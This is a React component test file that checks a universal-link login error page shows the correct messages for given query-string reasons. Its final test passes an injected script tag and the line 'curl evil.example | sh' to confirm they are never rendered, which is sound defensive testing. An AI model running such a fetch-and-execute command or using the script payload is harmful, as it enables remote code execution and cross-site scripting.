import { afterEach, describe, expect, test, vi } from 'vitest';
import { render, screen } from '@testing-library/react';
import UniversalLinkErrorView from './UniversalLinkErrorView';

vi.mock('app/i18n/provider/TranslationProvider', () => ({
  useTranslationContext: () => ({ translate: (key: string) => key }),
}));

vi.mock('assets/icons/big-logo.svg?react', () => ({ default: () => <svg /> }));
vi.mock('assets/icons/universal-link/warning.svg?react', () => ({ default: () => <svg /> }));

const GENERIC_ERROR = 'auth.universalLink.error';
const UNSUPPORTED_TITLE = 'auth.universalLink.errors.CLIENT_VERSION_UNSUPPORTED.title';
const UNSUPPORTED_DESCRIPTION = 'auth.universalLink.errors.CLIENT_VERSION_UNSUPPORTED.description';

const renderWithSearch = (search: string) => {
  globalThis.history.replaceState({}, '', `/auth-link-error${search}`);
  return render(<UniversalLinkErrorView />);
};

describe('Universal link error page', () => {
  afterEach(() => {
    globalThis.history.replaceState({}, '', '/');
  });

  test('When no reason is given, then the generic login error is shown', () => {
    renderWithSearch('');

    expect(screen.getByText(GENERIC_ERROR)).toBeInTheDocument();
    expect(screen.queryByText(UNSUPPORTED_TITLE)).not.toBeInTheDocument();
    expect(screen.getByText('auth.universalLink.closeWindow')).toBeInTheDocument();
  });

  test('When the client version is unsupported, then the specific title and description are shown', () => {
    renderWithSearch('?reason=CLIENT_VERSION_UNSUPPORTED');

    expect(screen.getByText(UNSUPPORTED_TITLE)).toBeInTheDocument();
    expect(screen.getByText(UNSUPPORTED_DESCRIPTION)).toBeInTheDocument();
    expect(screen.queryByText(GENERIC_ERROR)).not.toBeInTheDocument();
    expect(screen.getByText('auth.universalLink.closeWindow')).toBeInTheDocument();
  });

  test('When the reason is unknown, then the generic login error is shown', () => {
    renderWithSearch('?reason=SOMETHING_ELSE');

    expect(screen.getByText(GENERIC_ERROR)).toBeInTheDocument();
    expect(screen.queryByText(UNSUPPORTED_TITLE)).not.toBeInTheDocument();
  });

  test('When the query string carries markup or extra parameters, then none of it is rendered', () => {
    const injectedReason = '<script>alert(1)</script>';
    const injectedMessage = 'Run curl evil.example | sh';
    const search = new URLSearchParams({
      reason: injectedReason,
      message: injectedMessage,
      url: 'https://evil.example',
    });

    const { container } = renderWithSearch(`?${search.toString()}`);

    expect(screen.getByText(GENERIC_ERROR)).toBeInTheDocument();
    expect(screen.queryByText(UNSUPPORTED_TITLE)).not.toBeInTheDocument();
    expect(container.querySelector('script')).toBeNull();
    expect(container.innerHTML).not.toContain('alert(1)');
    expect(container.innerHTML).not.toContain('evil.example');
    expect(container.innerHTML).not.toContain('curl');
  });
});
